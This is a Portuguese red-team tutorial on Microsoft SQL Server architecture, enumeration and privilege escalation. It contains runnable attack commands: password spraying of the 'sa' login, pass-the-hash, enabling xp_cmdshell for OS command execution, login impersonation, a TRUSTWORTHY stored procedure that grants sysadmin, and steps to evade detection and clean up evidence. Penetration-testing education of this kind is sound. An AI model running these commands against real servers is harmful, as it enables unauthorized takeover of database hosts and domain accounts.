---
layout: cyber
section: sql-server
title: "MSSQL — Fundamentos e Enumeração"
---

# MSSQL — Fundamentos e Enumeração

# O que é?

Microsoft SQL Server (MSSQL) é o Sistema de Gerenciamento de Banco de Dados Relacional
(SGBD) da Microsoft, amplamente adotado em ambientes corporativos Windows. É a espinha
dorsal de armazenamento de dados para incontáveis aplicações empresariais, sistemas ERP,
plataformas .NET e infraestrutura Microsoft.

**Versões relevantes em ambientes reais:**

| Versão           | Ano  | Nível de suporte          | Observação                        |
|------------------|------|---------------------------|-----------------------------------|
| SQL Server 2008  | 2008 | EOL (sem patches)         | Ainda encontrado em legados       |
| SQL Server 2012  | 2012 | EOL                       | Comum em ambientes não atualizados|
| SQL Server 2016  | 2016 | Extended support          | Muito presente em corporativos    |
| SQL Server 2019  | 2019 | Mainstream support        | Mais comum em instalações novas   |
| SQL Server 2022  | 2022 | Mainstream support        | Mais recente, suporte Azure AD    |

**Tipos de instância:**

- **Instância padrão (default)**: nome `MSSQLSERVER`, serviço Windows com o mesmo nome.
  Escuta na porta TCP 1433 por padrão. Referenciada pelo hostname apenas: `SQL01\` ou
  simplesmente `SQL01`.

- **Instâncias nomeadas (named instances)**: nome no formato `MSSQL$NOMEINSTANCIA`
  como serviço Windows. Usam porta TCP dinâmica atribuída na instalação. O SQL Server
  Browser (porta UDP 1434) anuncia a porta real de cada instância nomeada para clientes.
  Referenciadas como `SQL01\SQLEXPRESS` ou `SQL01\PROD`.

**Modos de autenticação:**

- **Windows Authentication (Kerberos/NTLM via AD)**: o SQL Server valida o token do
  usuário Windows. A conta de domínio é o login. O SPN `MSSQLSvc/hostname:1433` deve
  estar registrado no AD para que Kerberos funcione corretamente — caso contrário, há
  fallback para NTLM.

- **SQL Authentication (Mixed Mode)**: o SQL Server mantém seu próprio banco de logins
  com usuário e senha. O login `sa` (System Administrator) é o login SQL padrão com
  privilégios máximos. Em instalações modernas, SA é desabilitado por padrão, mas
  frequentemente reativado por DBAs.

**Roles e permissões no nível do servidor:**

- `sysadmin`: acesso irrestrito. Pode habilitar `xp_cmdshell`, acessar todos os bancos,
  criar/remover qualquer objeto, ler a memória do processo, etc.
- `securityadmin`: gerencia logins e permissões de servidor — pode escalar para sysadmin
  concedendo permissões a si mesmo.
- `serveradmin`: configura opções de servidor e pode encerrar o serviço.
- `public`: role implícita da qual todos os logins são membros — permissões mínimas.

**Hash do NT da conta de serviço:** o SQL Server roda sob uma conta de serviço Windows.
O hash NT dessa conta pode ser capturado via coerção de autenticação ou extraído do
LSASS, transformando comprometimento do SQL em comprometimento da conta de serviço no
domínio — que frequentemente tem privilégios elevados.

# Onde é implementado?

SQL Server é encontrado em praticamente toda empresa Windows de médio e grande porte.
Os cenários de implantação mais comuns são:

**Sistemas ERP e aplicações corporativas:**

- **SAP em Windows**: muitas instalações SAP usam MSSQL como banco de dados subjacente,
  especialmente em versões mais antigas. A conta de serviço SAP frequentemente tem
  permissões amplas no SQL Server.
- **Microsoft Dynamics (AX, NAV, CRM)**: suite ERP/CRM da própria Microsoft,
  naturalmente integrada ao SQL Server com contas de domínio privilegiadas.
- **Aplicações .NET/C# customizadas**: a stack .NET usa SQL Server como padrão de fato.
  Connection strings em web.config ou appsettings.json frequentemente expõem credenciais.

**Infraestrutura Microsoft:**

- **SharePoint**: cada farm SharePoint tem múltiplos bancos SQL, frequentemente rodando
  em contas de domínio com acesso amplo.
- **SCCM/ConfigMgr**: o System Center Configuration Manager armazena inventário de
  hardware/software, políticas e credenciais de deployment em SQL Server.
- **Exchange (versões antigas)**: Exchange 2010 e anteriores usavam SQL Server para
  algumas funções de armazenamento.
- **WSUS**: Windows Server Update Services armazena metadados de patch em SQL Server
  local.

**Sistemas de Business Intelligence:**

- **SSRS (SQL Server Reporting Services)**: portal de relatórios, frequentemente exposto
  via HTTP, com credenciais de banco embutidas nos relatórios.
- **SSAS (SQL Server Analysis Services)**: cubo OLAP para análise multidimensional.
- **SSIS (SQL Server Integration Services)**: pipelines de ETL, frequentemente com
  credenciais de múltiplos sistemas armazenadas em packages.

**Sistemas críticos setoriais:**

- Sistemas de saúde (prontuários, faturamento, laboratório)
- Sistemas financeiros (contabilidade, folha de pagamento, conciliação bancária)
- ERPs industriais (MES, SCADA com histórico em SQL)
- Sistemas de RH e folha de pagamento

**Linked Servers — o grafo de confiança implícito:**

Em ambientes corporativos, é comum que instâncias SQL Server em diferentes servidores
estejam conectadas via Linked Servers — configurações que permitem a uma instância
executar queries em outra remotamente. Esse grafo de confiança cria caminhos de
movimentação lateral: uma instância com acesso limitado pode ser usada como pivô para
alcançar outra com sysadmin. É frequente encontrar cadeias de 3 ou mais instâncias
encadeadas, atravessando sub-redes e domínios diferentes.

# Como funciona de forma adequada?

**Arquitetura básica de uma instância SQL Server:**

```
Cliente (aplicação .NET, SSMS, PowerShell)
          |
          | TCP 1433 (instância padrão)
          | ou TCP <porta dinâmica> (instância nomeada, via UDP 1434 Browser)
          |
          v
+---------------------------+
|    SQL Server (sqlservr.exe)   |
|                           |
|  +---------------------+  |
|  | SQL Engine           |  |
|  |  - Query Processor   |  |
|  |  - Storage Engine    |  |
|  +---------------------+  |
|                           |
|  +---------------------+  |
|  | Security Manager     |  |
|  |  - Login Auth        |  |
|  |  - Permission Check  |  |
|  +---------------------+  |
|                           |
+---------------------------+
          |
          | Arquivos de banco de dados
          v
+---------------------------+
|  master.mdf / msdb.mdf    |  <- bancos do sistema
|  tempdb.mdf               |  <- trabalho temporário
|  model.mdf                |  <- template para novos bancos
|  CorporateDB.mdf          |  <- banco de aplicação
+---------------------------+
```

**Como a Windows Authentication funciona no SQL Server:**

```
1. Cliente (app .NET com Integrated Security=True) inicia conexão TCP
          |
          v
2. SQL Server inicia handshake SSPI (Negotiate)
          |
          |-- Se SPN MSSQLSvc/sql01.corp.local:1433 existe no AD -->
          |          Kerberos é usado (sem senha transmitida,
          |          cliente apresenta TGS obtido do KDC)
          |
          |-- Se SPN não existe ou cliente conecta por IP -->
          |          Fallback para NTLM
          |          (challenge-response com hash NT do usuário)
          v
3. SQL Server valida token via LSASS local ou Netlogon no DC
          |
          v
4. Se validação ok: cria sessão SQL com o contexto de segurança
   do usuário Windows — sem nenhuma senha armazenada no SQL
```

**Como Linked Servers funcionam legitimamente:**

```
Servidor A (SQL01)                    Servidor B (SQL02)
+--------------------+                +--------------------+
| SELECT * FROM      |                |                    |
| SQL02.CorporateDB  |                |                    |
| .dbo.Clientes      |                |                    |
|         |          |                |                    |
|         v          |                |                    |
| Linked Server      |--- RPC/TCP --->| SQL Server         |
| Config:            |                | aceita conexão     |
|  - Datasource:SQL02|                | com credenciais    |
|  - Provider: SQLNCLI|               | configuradas no    |
|  - Security: conta |                | linked server      |
|    de domínio X    |                |                    |
+--------------------+                +--------------------+

Configuração típica (via SSMS ou T-SQL):
EXEC sp_addlinkedserver 'SQL02', 'SQL Server';
EXEC sp_addlinkedsrvlogin 'SQL02', 'false', NULL, 'sa', 'SenhaDoLinkedServer';
-- ou usando conta Windows de domínio (be used self credentials):
EXEC sp_addlinkedsrvlogin 'SQL02', 'true';  -- usa credenciais do usuário atual
```

**xp_cmdshell — execução de SO a partir do SQL:**

```sql
-- xp_cmdshell é uma extended stored procedure que executa comandos de SO
-- Desabilitada por padrão desde SQL Server 2005
-- Estado armazenado em sys.configurations

-- Para habilitá-la (requer sysadmin):
-- 1. Habilitar 'show advanced options' (necessário para ver configurações avançadas)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 2. Habilitar xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 3. Executar comando de SO
EXEC xp_cmdshell 'whoami';
-- Retorna: nt service\mssqlserver  (conta de serviço)
-- ou:      corp\sql_service_account (conta de domínio)
-- ou:      nt authority\system      (configuração legada insegura)

-- O nível de privilégio do comando depende da conta de serviço do SQL Server:
--   NT AUTHORITY\SYSTEM    -> root no host
--   CORP\sql_service_acct  -> conta de domínio com seus privilégios no AD
--   NT SERVICE\MSSQLSERVER -> serviço virtual, privilégios locais limitados
```

**Por que xp_cmdshell é desabilitada por padrão:**

A Microsoft desabilitou xp_cmdshell por padrão em 2005 como parte das iniciativas
de segurança Surface Area Configuration, pois ela representa uma bridge direta entre
o contexto SQL e o sistema operacional. Um usuário com sysadmin e xp_cmdshell
habilitada tem, efetivamente, execução de código no SO — transformando qualquer
comprometimento de credenciais SQL em comprometimento do host.

**Hierarquia de objetos no SQL Server:**

```
SQL Server Instance
├── Server Logins (nível de servidor)
│   ├── CORP\joao.silva     (Windows Login - conta AD)
│   ├── sa                  (SQL Login - autenticação própria)
│   └── NT SERVICE\MSSQLSERVER (conta de serviço virtual)
│
└── Databases
    ├── master              (catálogo do sistema, configuração global)
    ├── msdb                (jobs do SQL Agent, histórico de backup)
    ├── model               (template para criação de novos bancos)
    ├── tempdb              (tabelas temporárias, operações de sort)
    └── CorporateDB         (banco de aplicação)
        ├── Users           (mapeados de Server Logins)
        │   ├── joao.silva  (mapeado de CORP\joao.silva)
        │   └── dbo         (owner do banco, mapeado de sa ou conta criadora)
        ├── Tables
        ├── Views
        ├── Stored Procedures
        └── Database Roles
            ├── db_owner    (controle total sobre o banco)
            ├── db_datareader (SELECT em todas as tabelas)
            └── db_datawriter (INSERT/UPDATE/DELETE)
```

---

## Instâncias, Logins e a Hierarquia de Privilégios

### Arquitetura Básica do SQL Server

O SQL Server opera como serviço Windows (`MSSQLSERVER` para instância padrão, `MSSQL$NOMEINSTANCIA` para instâncias nomeadas). Escuta por padrão na porta TCP 1433. Instâncias nomeadas usam SQL Server Browser (UDP 1434) para descoberta dinâmica de porta.

Hierarquia de objetos:
```
SQL Server Instance
├── Logins (nível de servidor)
│   ├── Windows Login (conta AD ou local)
│   ├── SQL Login (usuário/senha próprios do SQL)
│   └── Server Roles (sysadmin, securityadmin, serveradmin...)
└── Databases
    ├── Users (mapeados de Logins)
    └── Database Roles (db_owner, db_datareader, PUBLIC...)
```

### Modos de Autenticação

**Windows Authentication Mode (padrão recomendado pela Microsoft)**:
- O SQL Server aceita apenas tokens de autenticação Windows (Kerberos ou NTLM)
- O cliente apresenta seu token de segurança Windows ao se conectar
- Auditoria integrada com AD — eventos de logon aparecem no Event Viewer
- Conexão via string: `Server=SQL01;Database=master;Integrated Security=True`

**Mixed Mode (SQL Server and Windows Authentication)**:
- Aceita tanto Windows Authentication quanto SQL Logins (usuário/senha próprios do SQL)
- SA (System Administrator) é o login SQL padrão com senha configurável
- Em novas instalações desde SQL Server 2005, SA é **desabilitado por padrão** — mas frequentemente é habilitado por DBAs para "facilitar" o gerenciamento
- Erro de segurança comum: SA habilitado com senha fraca ou senha padrão/vazia

**Implicações para red team**:
- Windows Auth: se você tem uma conta de domínio, pode tentar autenticar. Permissões dependem do que foi concedido ao seu usuário/grupo.
- Mixed Mode com SA fraco: acesso direto como sysadmin sem precisar de conta AD
- Mixed Mode: possibilidade de password spraying em logins SQL sem acionar lockout de AD (logins SQL têm políticas de lockout separadas, frequentemente desabilitadas)

### Permissões e Roles no SQL Server

**Server-level roles** (nível de instância):
- `sysadmin`: acesso total a tudo. Pode executar qualquer operação, incluindo habilitar xp_cmdshell e acessar todos os bancos
- `securityadmin`: gerencia logins e permissões — pode escalar para sysadmin concedendo permissões a si mesmo
- `serveradmin`: configura opções de servidor — pode reiniciar serviços
- `bulkadmin`: pode executar BULK INSERT
- `public`: todos os logins são membros por padrão — permissões mínimas

**Database-level roles** (nível de banco):
- `db_owner`: controle total sobre o banco específico. Pode executar DDL, criar procedures, gerenciar usuários no banco. **Importante**: `db_owner` no banco `msdb` ou `master` pode escalar para sysadmin via técnicas específicas.
- `db_datareader`: pode fazer SELECT em todas as tabelas do banco
- `db_datawriter`: pode fazer INSERT/UPDATE/DELETE
- `db_ddladmin`: pode executar DDL (CREATE, ALTER, DROP)
- `PUBLIC`: role implícita de que todos os usuários de banco são membros

**Permissões individuais relevantes**:
- `EXECUTE`: pode executar stored procedures específicas
- `IMPERSONATE`: pode usar `EXECUTE AS` para executar como outro login/usuário
- `CONTROL`: equivalente a ownership no objeto
- `ALTER ANY LOGIN`: pode modificar qualquer login — caminho de escalação

### xp_cmdshell

`xp_cmdshell` é uma extended procedure que executa comandos do sistema operacional no contexto da conta de serviço do SQL Server. É a técnica mais direta de SQL → RCE.

Por padrão, está **desabilitada** desde SQL Server 2005, mas pode ser habilitada por qualquer membro do role `sysadmin` via `sp_configure`. O SQL Server armazena o estado habilitado/desabilitado em `sys.configurations`.

A account de serviço sob a qual o SQL Server roda determina o nível de privilégio do RCE:
- `NETWORK SERVICE` (padrão antigo): privilégios limitados
- `NT AUTHORITY\SYSTEM` (comum em configurações legadas): privilégios máximos no host
- Conta de domínio dedicada (recomendado, mas frequentemente com privilégios excessivos): varia
- SQL Server com `LocalSystem` ou conta de domínio privilegiada = comprometimento imediato do host e, frequentemente, do domínio

---

## Na Prática

### Fase 1: Descoberta de Instâncias SQL Server na Rede

**Via Nmap — descoberta de porta**:
```bash
# Scan básico de porta 1433
nmap -p 1433 --open -sV 192.168.1.0/24

# Scan mais detalhado com scripts NSE específicos para MSSQL
nmap -p 1433 --open -sV --script ms-sql-info,ms-sql-config,ms-sql-empty-password 192.168.1.0/24

# SQL Server Browser escuta UDP 1434 — descobre instâncias nomeadas
nmap -sU -p 1434 --open --script ms-sql-info 192.168.1.0/24
```

O script `ms-sql-info` extrai: versão do SQL Server, instâncias disponíveis, portas usadas, e se está aceitando conexões.

**Via PowerUpSQL — descoberta via Active Directory (SPN)**:

PowerUpSQL é a ferramenta de referência para atacar MSSQL em ambientes AD. A abordagem mais eficaz é consultar os Service Principal Names (SPNs) no AD — toda instância SQL Server registrada corretamente no AD tem um SPN no formato `MSSQLSvc/servidor.dominio.com:1433` ou `MSSQLSvc/servidor.dominio.com:INSTANCIA`.

```powershell
# Importar o módulo
Import-Module .\PowerUpSQL.ps1

# Descobrir instâncias via SPN no AD (método mais completo)
Get-SQLInstanceDomain

# Output inclui: ComputerName, Instance, DomainAccount (conta de serviço), SPNs registrados
# Qualquer usuário autenticado no domínio pode fazer essa consulta — não requer privilégios

# Scan UDP broadcast para descobrir instâncias que não têm SPN registrado
Get-SQLInstanceScanUDP -ComputerName 192.168.1.0/24

# Descobrir instâncias em hosts específicos
Get-SQLInstanceScanUDP -ComputerName "SQL01","SQL02","FILESERVER"

# Combinar: descoberta via AD + teste de acesso
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

**Via Impacket — sem PowerShell no host**:
```bash
# Consulta LDAP para SPNs de MSSQL (da máquina do atacante, sem precisar de acesso ao host alvo)
python3 GetUserSPNs.py DOMINIO/usuario:senha -dc-ip 192.168.1.10 | grep MSSQLSvc

# Conexão direta
mssqlclient.py DOMINIO/usuario:senha@192.168.1.50 -windows-auth
mssqlclient.py sa:Password123@192.168.1.50
```

### Fase 2: Teste de Acesso e Autenticação

```powershell
# Testar conexão com Windows Auth (usa credenciais do usuário atual)
Get-SQLConnectionTest -Instance "SQL01.dominio.local,1433" -Verbose

# Testar com instância nomeada
Get-SQLConnectionTest -Instance "SQL01\SQLEXPRESS" -Verbose

# Testar lista de instâncias com Windows Auth em paralelo
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 10

# Testar com SQL Login (SA ou outro)
Get-SQLConnectionTestThreaded -Instance "SQL01" -Username "sa" -Password "Password123" -Verbose

# Password spray em SQL Logins (não dispara lockout AD)
$instancias = Get-SQLInstanceDomain
$senhas = @("Password123", "Passw0rd", "Summer2024!", "Company@123")
foreach ($inst in $instancias) {
    foreach ($senha in $senhas) {
        Get-SQLConnectionTest -Instance $inst.Instance -Username "sa" -Password $senha
    }
}
```

**Via Impacket (sem Windows)**:
```bash
# Windows Auth (requer ticket Kerberos ou hash NTLM)
mssqlclient.py DOMINIO/usuario:senha@SQL01.dominio.local -windows-auth
mssqlclient.py -hashes :NThashaqui DOMINIO/usuario@SQL01 -windows-auth  # Pass-the-Hash

# SQL Auth
mssqlclient.py sa:Password123@SQL01
```

### Fase 3: Enumeração Após Acesso

```powershell
# Informações gerais da instância
Get-SQLServerInfo -Instance "SQL01"
# Retorna: nome do servidor, versão, role (sysadmin?), conta de serviço, databases, etc.

# Listar todos os bancos
Get-SQLDatabase -Instance "SQL01" -NoDefaults
# -NoDefaults exclui master, msdb, model, tempdb

# Listar tabelas de um banco específico
Get-SQLTable -Instance "SQL01" -DatabaseName "CorporateDB"

# Buscar colunas com nomes interessantes (senhas, cartões, CPF...)
Get-SQLColumn -Instance "SQL01" -DatabaseName "CorporateDB" -ColumnNameSearch "password"
Get-SQLColumn -Instance "SQL01" -DatabaseName "CorporateDB" -ColumnNameSearch "credit"
Get-SQLColumn -Instance "SQL01" -DatabaseName "CorporateDB" -ColumnNameSearch "ssn"

# Auditoria completa de configurações e permissões
Invoke-SQLAudit -Instance "SQL01" -Verbose
# Verifica: xp_cmdshell, CLR, impersonation, linked servers, fraquezas de permissão...

# Listar logins e suas roles
Get-SQLServerLogin -Instance "SQL01"

# Verificar se somos sysadmin
Invoke-SQLQuery -Instance "SQL01" -Query "SELECT IS_SRVROLEMEMBER('sysadmin')"
# 1 = sim, 0 = não
```

---

## Exemplos de Código / Comandos

### Verificar e Habilitar xp_cmdshell

```sql
-- Verificar status atual do xp_cmdshell
SELECT name, value, value_in_use, description
FROM sys.configurations
WHERE name = 'xp_cmdshell';
-- value_in_use = 0: desabilitado; 1: habilitado

-- Verificar se 'show advanced options' está habilitado
SELECT name, value_in_use FROM sys.configurations WHERE name = 'show advanced options';

-- Habilitar xp_cmdshell (requer sysadmin)
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Verificar se funcionou
SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
-- Deve retornar 1

-- Executar comando
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'hostname';
EXECUTE xp_cmdshell 'ipconfig /all';
EXECUTE xp_cmdshell 'net user';
EXECUTE xp_cmdshell 'net group "Domain Admins" /domain';

-- Desabilitar novamente (OPSEC — limpar rastros)
EXECUTE sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
EXECUTE sp_configure 'show advanced options', 0;
RECONFIGURE;
```

### Impersonation — EXECUTE AS

A impersonation permite executar código no contexto de outro login ou usuário. É uma forma legítima de testar permissões, mas pode ser abusada para escalar privilégios.

```sql
-- Verificar quais logins PODEM ser impersonados pelo usuário atual
-- (mostra logins que concederam IMPERSONATE a outros)
SELECT DISTINCT b.name
FROM sys.database_permissions a
INNER JOIN sys.database_principals b
    ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Versão mais completa — mostra quem pode impersonar quem
SELECT
    l.name AS login_que_pode_impersonar,
    sl.name AS login_alvo
FROM sys.server_permissions sp
INNER JOIN sys.server_principals l
    ON sp.grantee_principal_id = l.principal_id
INNER JOIN sys.server_principals sl
    ON sp.major_id = sl.principal_id
WHERE sp.permission_name = 'IMPERSONATE'
    AND sp.state IN ('G', 'W');  -- G=GRANT, W=GRANT WITH GRANT OPTION

-- Verificar permissões de impersonation no banco atual
SELECT
    pe.permission_name,
    pe.state_desc,
    pr.name AS grantor,
    us.name AS grantee
FROM sys.database_permissions pe
INNER JOIN sys.database_principals pr
    ON pe.major_id = pr.principal_id
INNER JOIN sys.database_principals us
    ON pe.grantee_principal_id = us.principal_id
WHERE pe.permission_name = 'IMPERSONATE';

-- Executar como login SA (se tiver permissão)
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  -- Deve mostrar 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin');  -- Deve mostrar 1

-- Habilitar xp_cmdshell como SA
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

-- Reverter impersonation
REVERT;
SELECT SYSTEM_USER;  -- Volta para o usuário original

-- Impersonation encadeada (se SA pode impersonar outro sysadmin)
EXECUTE AS LOGIN = 'sa';
EXECUTE AS LOGIN = 'outro_sysadmin';
SELECT SYSTEM_USER;
REVERT;
REVERT;
```

### Enumeração de Permissões via T-SQL Direto

```sql
-- Verificar permissões efetivas do usuário atual
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Listar todos os logins e roles
SELECT
    l.name,
    l.type_desc,
    l.is_disabled,
    r.name AS server_role
FROM sys.server_principals l
LEFT JOIN sys.server_role_members rm ON l.principal_id = rm.member_principal_id
LEFT JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
WHERE l.type NOT IN ('R')  -- Excluir roles da lista principal
ORDER BY l.name;

-- Membros do role sysadmin
SELECT l.name
FROM sys.server_principals l
INNER JOIN sys.server_role_members rm ON l.principal_id = rm.member_principal_id
INNER JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
WHERE r.name = 'sysadmin';

-- Verificar configurações de segurança relevantes
SELECT name, value_in_use
FROM sys.configurations
WHERE name IN (
    'xp_cmdshell',
    'clr enabled',
    'Ole Automation Procedures',
    'show advanced options',
    'remote admin connections',
    'cross db ownership chaining'
);

-- Verificar conta de serviço do SQL Server (sem sysadmin)
SELECT SERVERPROPERTY('ServiceName');
SELECT SERVERPROPERTY('MachineName');
SELECT SERVERPROPERTY('ServerName');
SELECT @@VERSION;

-- Listar databases e owners
SELECT
    name,
    owner_sid,
    SUSER_SNAME(owner_sid) AS owner_name,
    create_date,
    is_trustworthy_on,  -- IMPORTANTE: Trustworthy + db_owner = sysadmin potencial
    is_db_chaining_on
FROM sys.databases;

-- Bancos com TRUSTWORTHY habilitado (vetor de escalação)
SELECT name FROM sys.databases WHERE is_trustworthy_on = 1;
```

### Escalação via db_owner no banco msdb ou banco TRUSTWORTHY

```sql
-- Se você é db_owner de um banco com TRUSTWORTHY=ON e o owner é sysadmin:
-- 1. Criar procedure no banco trustworthy que adiciona seu usuário ao sysadmin
USE [banco_trustworthy];

CREATE PROCEDURE sp_escalacao
WITH EXECUTE AS OWNER
AS
    EXEC master..sp_addsrvrolemember 'DOMINIO\seu_usuario', 'sysadmin';
GO

EXECUTE sp_escalacao;

-- Verificar
USE master;
SELECT IS_SRVROLEMEMBER('sysadmin');  -- Deve ser 1 agora
```

### PowerUpSQL — Comandos de Enumeração Avançada

```powershell
# Enumeração completa com Invoke-SQLAudit
Invoke-SQLAudit -Instance "SQL01" -Verbose | Out-GridView

# Buscar dados sensíveis em colunas
Get-SQLColumnSampleDataThreaded -Instance "SQL01" -Keywords "password,secret,key,token" -SampleSize 5

# Listar todas as stored procedures em todos os bancos
Get-SQLStoredProcedure -Instance "SQL01" -NoDefaults

# Verificar linked servers
Get-SQLServerLink -Instance "SQL01"

# Mapear todos os linked servers recursivamente
Get-SQLServerLinkCrawl -Instance "SQL01" -Verbose

# Verificar permissões de impersonation
Invoke-SQLAuditPrivImpersonateLogin -Instance "SQL01" -Verbose
```

---

## Detecção e OPSEC

### O Que os Defensores Veem

**Event IDs relevantes no Windows Event Log**:
- `4624` / `4625`: Logon/Logon failure no host do SQL Server (Windows Auth)
- `4648`: Logon com credenciais explícitas
- `4688`: Criação de processo — disparado quando `xp_cmdshell` executa comandos (cmd.exe, powershell.exe como filhos do sqlservr.exe)

**SQL Server Audit Log** (se habilitado):
- Eventos de `sp_configure` (mudanças de configuração)
- Tentativas de EXECUTE AS
- Acesso a objetos auditados

**SIEM signatures**:
- Queries contendo `xp_cmdshell`, `sp_configure`, `EXECUTE AS LOGIN`
- Conexões de IPs externos ou incomuns na porta 1433
- Número anormal de queries de `sys.configurations`, `sys.server_principals`

### Técnicas de OPSEC

**Minimizar ruído durante enumeração**:
```powershell
# Usar Threads baixo para evitar muitas conexões simultâneas
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 3

# Evitar Invoke-SQLAudit completo em produção — muito barulhento
# Prefira queries manuais específicas
```

**xp_cmdshell — alternativas mais silenciosas**:
```sql
-- OLE Automation (menos monitorado que xp_cmdshell em muitos ambientes)
DECLARE @obj INT;
DECLARE @resultado INT;
EXEC sp_oacreate 'WScript.Shell', @obj OUT;
EXEC sp_oamethod @obj, 'Run', @resultado OUT, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt', 0, TRUE;
EXEC sp_oadestroy @obj;
-- Ler resultado:
EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';

-- Habilitar OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

**Limpeza de evidências**:
```sql
-- Verificar o que ficou habilitado e desabilitar
SELECT name, value_in_use FROM sys.configurations
WHERE name IN ('xp_cmdshell', 'Ole Automation Procedures', 'clr enabled');

-- Desabilitar tudo que foi habilitado
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
EXEC sp_configure 'clr enabled', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;

-- Não dá para apagar logs do SQL Server sem ser sysadmin no servidor
-- Mas procedures criadas podem ser dropadas:
DROP PROCEDURE IF EXISTS sp_escalacao;
```

**Durante password spraying em SQL Logins**:
- SQL Logins têm política de lockout separada do AD (frequentemente desabilitada)
- Mas tentativas falhas aparecem no SQL Server Error Log: `%ProgramFiles%\Microsoft SQL Server\MSSQL\LOG\ERRORLOG`
- Verificar política: `SELECT LOGINPROPERTY('sa', 'LockoutTime')`, `LOGINPROPERTY('sa', 'IsLocked')`

---

## Módulos Relacionados

`02_mssql_lateral_movement_e_rce.md` usa os acessos enumerados aqui para executar Linked Server chains, CLR Assemblies e UNC path capture. `../09_active_directory/02_kerberoasting_e_asrep.md` cobre Kerberoasting de SPNs `MSSQLSvc/` — contas de serviço MSSQL são candidatos frequentes. `../06_pos_exploracao_windows/03_credenciais_windows.md` cobre DPAPI e credenciais armazenadas por aplicações que conectam ao SQL Server. ATT&CK T1505.001 (SQL Stored Procedures), T1078 (Valid Accounts) e T1548 (Impersonation/db_owner) mapeiam as técnicas desta nota.
  - T1021.002: Remote Services — SMB (via xp_cmdshell + net use)
- **Ferramentas**:
  - PowerUpSQL: `https://github.com/NetSPI/PowerUpSQL`
  - Impacket mssqlclient: `https://github.com/fortra/impacket`
  - MSSQL Spider (alternativa ao PowerUpSQL): `https://github.com/Jtekt/mssql-spider`
